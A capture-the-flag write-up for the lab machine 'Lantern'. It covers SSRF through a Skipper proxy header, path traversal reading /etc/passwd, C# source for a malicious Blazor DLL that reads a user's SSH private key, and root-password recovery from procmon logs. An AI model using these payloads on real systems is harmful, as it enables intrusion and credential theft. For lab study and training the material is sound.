---
description: Linux 🔮 Hard
cover: https://i.pinimg.com/564x/6c/23/c8/6c23c8aeb566aa947460cd04acfc1635.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Lantern

## Recon

### Nmap

```
# Nmap 7.94SVN scan initiated Mon Aug 19 23:23:16 2024 as: nmap -A -T4 -sC -sV -p- -oN nmap.txt 10.10.11.29
Warning: 10.10.11.29 giving up on port because retransmission cap hit (6).
Nmap scan report for lantern.htb (10.10.11.29)
Host is up (0.19s latency).
Not shown: 65454 closed tcp ports (conn-refused), 78 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)
|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)
80/tcp   open  http    Skipper Proxy
|_http-title: Lantern
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Length: 207
|     Content-Type: text/html; charset=utf-8
|     Date: Tue, 20 Aug 2024 03:50:43 GMT
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Length: 225
|     Content-Type: text/html; charset=utf-8
|     Date: Tue, 20 Aug 2024 03:50:36 GMT
|     Location: http://lantern.htb/
|     Server: Skipper Proxy
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS, HEAD
|     Content-Length: 0
|     Content-Type: text/html; charset=utf-8
|     Date: Tue, 20 Aug 2024 03:50:37 GMT
|_    Server: Skipper Proxy
|_http-server-header: Skipper Proxy
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 500 Internal Server Error
|     Connection: close
|     Content-Type: text/plain; charset=utf-8
|     Date: Tue, 20 Aug 2024 03:50:41 GMT
|     Server: Kestrel
|     System.UriFormatException: Invalid URI: The hostname could not be parsed.
|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions& creationOptions)
|     System.Uri..ctor(String uriString, UriKind uriKind)
|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)
|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.<InitializeStandardComponentServicesAsync>g__InitializeCore|5_0(HttpContext httpContext)
|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Length: 0
|     Connection: close
|     Date: Tue, 20 Aug 2024 03:50:47 GMT
|     Server: Kestrel
|   Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Tue, 20 Aug 2024 03:50:41 GMT
|     Server: Kestrel
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Length: 0
|     Connection: close
|     Date: Tue, 20 Aug 2024 03:50:47 GMT
|     Server: Kestrel
|   SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Tue, 20 Aug 2024 03:51:03 GMT
|_    Server: Kestrel
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94SVN%I=7%D=8/19%Time=66C4128C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,18F,"HTTP/1\.0\x20302\x20Found\r\nContent-Length:\x20225\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Tue,\x2020\x20A
SF:ug\x202024\x2003:50:36\x20GMT\r\nLocation:\x20http://lantern\.htb/\r\nS
SF:erver:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>
SF:\n<title>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\
SF:x20should\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x
SF:20URL:\x20<a\x20href=\"http://lantern\.htb/\">http://lantern\.htb/</a>\
SF:.\x20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,A5,"HTTP/1\
SF:.0\x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length
SF::\x200\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nDate:\x20Tue,
SF:\x2020\x20Aug\x202024\x2003:50:37\x20GMT\r\nServer:\x20Skipper\x20Proxy
SF:\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(FourOhFourRequest,162,"HTTP/1\.0\x20404\x20
SF:Not\x20Found\r\nContent-Length:\x20207\r\nContent-Type:\x20text/html;\x
SF:20charset=utf-8\r\nDate:\x20Tue,\x2020\x20Aug\x202024\x2003:50:43\x20GM
SF:T\r\nServer:\x20Skipper\x20Proxy\r\n\r\n<!doctype\x20html>\n<html\x20la
SF:ng=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>T
SF:he\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20server\.\
SF:x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20check\x2
SF:0your\x20spelling\x20and\x20try\x20again\.</p>\n")%r(GenericLines,67,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(He
SF:lp,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
SF:t")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.94SVN%I=7%D=8/19%Time=66C41291%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,114E,"HTTP/1\.1\x20500\x20Internal\x20Server\x20Error\r\nCo
SF:nnection:\x20close\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Date:\x20Tue,\x2020\x20Aug\x202024\x2003:50:41\x20GMT\r\nServer:\x20Kes
SF:trel\r\n\r\nSystem\.UriFormatException:\x20Invalid\x20URI:\x20The\x20ho
SF:stname\x20could\x20not\x20be\x20parsed\.\n\x20\x20\x20at\x20System\.Uri
SF:\.CreateThis\(String\x20uri,\x20Boolean\x20dontEscape,\x20UriKind\x20ur
SF:iKind,\x20UriCreationOptions&\x20creationOptions\)\n\x20\x20\x20at\x20S
SF:ystem\.Uri\.\.ctor\(String\x20uriString,\x20UriKind\x20uriKind\)\n\x20\
SF:x20\x20at\x20Microsoft\.AspNetCore\.Components\.NavigationManager\.set_
SF:BaseUri\(String\x20value\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Co
SF:mponents\.NavigationManager\.Initialize\(String\x20baseUri,\x20String\x
SF:20uri\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Components\.Server\.C
SF:ircuits\.RemoteNavigationManager\.Initialize\(String\x20baseUri,\x20Str
SF:ing\x20uri\)\n\x20\x20\x20at\x20Microsoft\.AspNetCore\.Mvc\.ViewFeature
SF:s\.StaticComponentRenderer\.<InitializeStandardComponentServicesAsync>g
SF:__InitializeCore\|5_0\(HttpContext\x20httpContext\)\n\x20\x20\x20at\x20
SF:Microsoft\.AspNetCore\.Mvc\.ViewFeatures\.StaticC")%r(Help,78,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20cl
SF:ose\r\nDate:\x20Tue,\x2020\x20Aug\x202024\x2003:50:41\x20GMT\r\nServer:
SF:\x20Kestrel\r\n\r\n")%r(HTTPOptions,6F,"HTTP/1\.1\x20200\x20OK\r\nConte
SF:nt-Length:\x200\r\nConnection:\x20close\r\nDate:\x20Tue,\x2020\x20Aug\x
SF:202024\x2003:50:47\x20GMT\r\nServer:\x20Kestrel\r\n\r\n")%r(RTSPRequest
SF:,87,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nContent
SF:-Length:\x200\r\nConnection:\x20close\r\nDate:\x20Tue,\x2020\x20Aug\x20
SF:2024\x2003:50:47\x20GMT\r\nServer:\x20Kestrel\r\n\r\n")%r(SSLSessionReq
SF:,78,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\nDate:\x20Tue,\x2020\x20Aug\x202024\x2003:51:03\x20G
SF:MT\r\nServer:\x20Kestrel\r\n\r\n")%r(TerminalServerCookie,78,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20clo
SF:se\r\nDate:\x20Tue,\x2020\x20Aug\x202024\x2003:51:03\x20GMT\r\nServer:\
SF:x20Kestrel\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 19 23:52:17 2024 -- 1 IP address (1 host up) scanned in 1741.66 seconds
```

Starting with the Nmap scan, the website opens ports 22, 80, and 3000. And especially port 80 is <mark style="color:red;">**`Skipper Proxy`**</mark>  server. Which is vulnerable to SSRF by adding <mark style="color:red;">**`X-Skipper-Proxy`**</mark> header For more information, you can read [here](https://www.exploit-db.com/exploits/51111)

### Web app

After navigating to each port 80 and 3000. There is a login page in port 3000

<figure><img src="../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

## SSRF

Ports 3000, 5000, and 8000 are commonly utilized by web applications or local services running on a server. When checking for an <mark style="color:red;">**`X-Skipper-Proxy`**</mark> SSRF (Server-Side Request Forgery) vulnerability, the objective is to send a request with a <mark style="color:red;">**`X-Skipper-Proxy`**</mark> header directed to <mark style="color:red;">**`http://127.0.0.1:5000/`**</mark> to determine if the proxy can be leveraged to access a local service on the server.

These local services are typically not exposed to the Internet and are only accessible internally (via <mark style="color:red;">**`localhost`**</mark>). If the proxy is susceptible to an SSRF vulnerability, an attacker could exploit this to send requests to internal services that are otherwise inaccessible from the outside world.

Port 5000 is often the default port for web applications built with Flask (a Python microframework) or other similar services. Therefore, testing whether Skipper Proxy can be used to access a local service running on this port is crucial.

If a response is returned from port 5000, it indicates that the proxy can be exploited to access the internal service, confirming the presence of an SSRF vulnerability in the system.

The thing to note here is that Lantern uses the .NET framework. The <mark style="color:red;">**`/_framework/`**</mark> directory in an ASP.NET Core Blazor application is a system directory that contains the compiled framework files required to run the Blazor application. These files are necessary for the client-side (WebAssembly) or server-side (SignalR) Blazor components to function properly.

#### Contents of <mark style="color:red;">`/_framework/`</mark> Directory:

1. **.dll Files**: These are the compiled assemblies for both the application and the .NET runtime. They include:
   * **Application DLLs**: The compiled code of your Blazor app.
   * **Framework DLLs**: .NET Core and other library assemblies required by Blazor.
2. **.blat Files**: These are binary large objects used by Blazor WebAssembly to cache resources.
3. **.wasm Files**: WebAssembly files that contain the compiled .NET runtime for Blazor WebAssembly applications. They allow the Blazor app to run in the browser.
4. **.js Files**: JavaScript files used by the Blazor framework to bootstrap and interact with the WebAssembly runtime.
5. **.json Files**: Configuration files such as <mark style="color:red;">**`blazor.boot.json`**</mark> those that describe how to load the application and its dependencies.

{% hint style="info" %}
More information [**`here`**](https://learn.microsoft.com/en-us/aspnet/core/blazor/host-and-deploy/webassembly?view=aspnetcore-8.0#github-pages)
{% endhint %}

We know that The <mark style="color:red;">**`blazor.boot.json`**</mark> file is a critical configuration file in Blazor WebAssembly applications. It contains metadata that the Blazor runtime uses to initialize the application. This file is generated automatically during the build process and is located within the <mark style="color:red;">**`/_framework/`**</mark> directory. So let's try to access it:

<figure><img src="../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

It doesn't look very clear but there is something quite interesting which is <mark style="color:red;">**`InternaLantern.dll`**</mark>

Try to download <mark style="color:red;">**`InternalLantern.dll`**</mark>:&#x20;

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

Because <mark style="color:red;">**`.dll`**</mark> files are not easy to read in a normal way, to make it easier we will use [**dotPeek**](#user-content-fn-1)[^1]

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

Decode each base64 string and you will have the login page credentials

## Tomas

### LFI

Source code <mark style="color:red;">**`app.py`**</mark>

```python
from flask import Flask, render_template, send_file, request, redirect, json
from werkzeug.utils import secure_filename
import os

app=Flask("__name__")

@app.route('/')
def index():
    if request.headers['Host'] != "lantern.htb":
        return redirect("http://lantern.htb/", code=302)
    return render_template("index.html")

@app.route('/vacancies')
def vacancies():
    return render_template('vacancies.html')

@app.route('/submit', methods=['POST'])
def save_vacancy():
    name = request.form.get('name')
    email = request.form.get('email')
    vacancy = request.form.get('vacancy', default='Middle Frontend Developer')

    if 'resume' in request.files:
        try:
            file = request.files['resume']
            resume_name = file.filename
            if resume_name.endswith('.pdf') or resume_name == '':
                filename = secure_filename(f"resume-{name}-{vacancy}-latern.pdf")
                upload_folder = os.path.join(os.getcwd(), 'uploads')
                destination = '/'.join([upload_folder, filename])
                file.save(destination)
            else:
                return "Only PDF files allowed!"
        except:
            return "Something went wrong!"
    return "Thank you! We will conact you very soon!"

@app.route('/PrivacyAndPolicy')
def sendPolicyAgreement():
    lang = request.args.get('lang')
    file_ext = request.args.get('ext')
    try:
            return send_file(f'/var/www/sites/localisation/{lang}.{file_ext}') 
    except: 
            return send_file(f'/var/www/sites/localisation/default/policy.pdf', 'application/pdf')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8000)
```

In the <mark style="color:red;">**`/PrivacyAndPolicy`**</mark> route, a potential **File Disclosure Vulnerability** exists due to the way files are served. The route allows users to download files based on the <mark style="color:red;">**`lang`**</mark> and <mark style="color:red;">**`file_ext`**</mark>parameters:

```python
return send_file(f'/var/www/sites/localisation/{lang}.{file_ext}')
```

If these parameters are not adequately sanitized, it opens the door to path traversal attacks. This vulnerability could allow an attacker to access files outside the intended directory, potentially exposing sensitive information.

For example, by crafting a URL like <mark style="color:red;">**`/PrivacyAndPolicy?lang=../../../../etc/resolv&ext=conf`**</mark>, an attacker could combine the <mark style="color:red;">**`lang`**</mark> and <mark style="color:red;">**`ext`**</mark> parameters to access the <mark style="color:red;">**`/etc/resolv.conf`**</mark> file or other critical files on the server. This illustrates how improper validation of input parameters can lead to severe security risks.

To access the <mark style="color:red;">**`/etc/passwd`**</mark> file and enumerate existing users, we encounter a restriction where the `.` symbol separates the filename from the extension. However, this limitation can be circumvented with a simple trick. By crafting a URL <mark style="color:red;">**`http://lantern.htb/PrivacyAndPolicy?lang=../../../../&ext=./etc/passwd`**</mark>, the path is constructed in a way that effectively bypasses the restriction, allowing access to the desired file:

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

We know that the user here is <mark style="color:red;">**`Tomas`**</mark>

I tried searching for a few words where it wasn't there and I got a message saying:

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

The <mark style="color:red;">**`/opt/component`**</mark> directory contains <mark style="color:red;">**.dll**</mark> files and an idea came up to upload the exploit.dll file to trigger it. But we must change its default path which is <mark style="color:red;">**`/var/www/sites/lantern.htb/static/images`**</mark>

To do that we can use the BurpSuite extension:

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

These are the steps to trigger upload:

* Create a new .NET class library project

```sh
dotnet new classlib -n exploit
```

* Go to the exploit directory
* Adds the <mark style="color:red;">**`Microsoft.AspNetCore.Components`**</mark> package as a dependency on the project.

```bash
dotnet add package Microsoft.AspNetCore.Components --version 6.0.0
```

* Edit <mark style="color:red;">**`Class1.cs`**</mark> file content

{% code title="Class1.cs" %}
```csharp
using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using System.IO;

namespace exploit
{
    public class Component : ComponentBase
    {
        protected override void BuildRenderTree(RenderTreeBuilder builder)
        {
            base.BuildRenderTree(builder);

            // Read the content of the sensitive file
            string file = File.ReadAllText("/home/tomas/.ssh/id_rsa");

            // Add the content to the render tree
            builder.AddContent(0, file);
        }
    }
}
```
{% endcode %}

* Builds the project in Release configuration:

```bash
dotnet build -c Release
```

The <mark style="color:red;">**`exploit.dll`**</mark> file will be located in <mark style="color:red;">**`bin/Release/net6.0`**</mark>:&#x20;

<figure><img src="../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

### Upload <mark style="color:red;">**`exploit.dll`**</mark> PoC&#x20;

{% embed url="https://drive.google.com/file/d/1tWMd3IbRZXgggw0MjId18L_PPkvx2LiU/view?usp=sharing" %}

## Root

Display the user's sudo privileges, showing what commands the user is allowed to run with <mark style="color:red;">**`sudo -l`**</mark>

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

* In Linux, the term <mark style="color:red;">**`procmon`**</mark> might refer to several different tools or custom scripts, depending on the specific context. It's important to note that <mark style="color:red;">**`procmon`**</mark> is not a standard tool on Linux systems by default, unlike **top**, **htop**, or **ps**.

Display detailed information about all running processes on the system using <mark style="color:red;">**ps -aef**</mark>

<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

* The script <mark style="color:red;">**`automation.sh`**</mark> likely contains a series of commands and operations that are automated to perform a specific task or set of tasks. The exact purpose would depend on the content of the script.
* Common tasks for such scripts might include system maintenance, backups, updates, or other administrative tasks.

Monitor <mark style="color:red;">**automation.sh**</mark> activities of a process on a Linux system:

```bash
sudo /usr/bin/procmon -p <PID> -e write
```

Wait a little bit and press F6 to export then F9 to exit

<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Put it in your own machine:&#x20;

<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Because it's a database file, we can use <mark style="color:red;">**`sqlite3`**</mark>:

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

It has quite a few steps to get the root password so I will use this for fast

```sql
SELECT hex(substr(arguments, 9, resultcode))
FROM ebpf
WHERE resultcode > 0
ORDER BY timestamp;
```

**Explain:**

**1. SELECT hex(substr(arguments, 9, resultcode))**

* **`SELECT`**: This is the SQL command used to specify the columns or expressions you want to retrieve from the database.
* **`hex(substr(arguments, 9, resultcode))`**:
  * **`hex()`**: This function converts a string or binary data into its hexadecimal representation. The result of the `substr()` function will be converted into a hexadecimal string.
  * **`substr(arguments, 9, resultcode)`**:
    * **`substr()`**: This function extracts a substring from a given string. It takes three arguments:
      1. **`arguments`**: The string from which the substring is extracted. This is likely a column in the **`ebpf`** table containing some data related to eBPF events.
      2. **`9`**: The starting position (1-based index) in the **`arguments`** string from where the substring should begin. In this case, it starts at the 9th character.
      3. **`resultcode`**: The length of the substring to extract, which is dynamically determined by the value in the **`resultcode`** column for each row.
    * The combination of **`substr(arguments, 9, resultcode)`** extracts a substring from the **`arguments`** field starting at the 9th character and continuing for **`resultcode`** characters.

**2. FROM ebpf**

* **`FROM ebpf`**: Specifies the source of the data, which is the **`ebpf`** table. This table likely contains logs or event data related to eBPF activities, including the **`arguments`** and **`resultcode`** columns.

**3. WHERE resultcode > 0**

* **`WHERE resultcode > 0`**: Filters the rows based on the condition that the **`resultcode`** column's value must be greater than 0. This implies that only successful or significant events (those with a positive `resultcode`) are of interest and will be included in the results.

**4. ORDER BY timestamp**

* **`ORDER BY timestamp`**: Orders the resulting rows by the **`timestamp`** column. This column presumably records when each event occurred, and ordering by it would sort the events chronologically.

Copy the result and decode it using [<mark style="color:red;">**`CyberChef`**</mark>](https://gchq.github.io/CyberChef/)

<figure><img src="../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Download and read it

<figure><img src="../../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Remove the spaces and combine the duplicated words twice and we will get the root password

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

[^1]: dotPeek is a free-of-charge standalone tool based on [ReSharper](https://www.jetbrains.com/resharper/)'s bundled decompiler. It can reliably decompile any .NET assembly into equivalent C# or IL code.

    The decompiler supports multiple formats including libraries (_.dll_), executables (_.exe_), and Windows metadata files (_.winmd_).
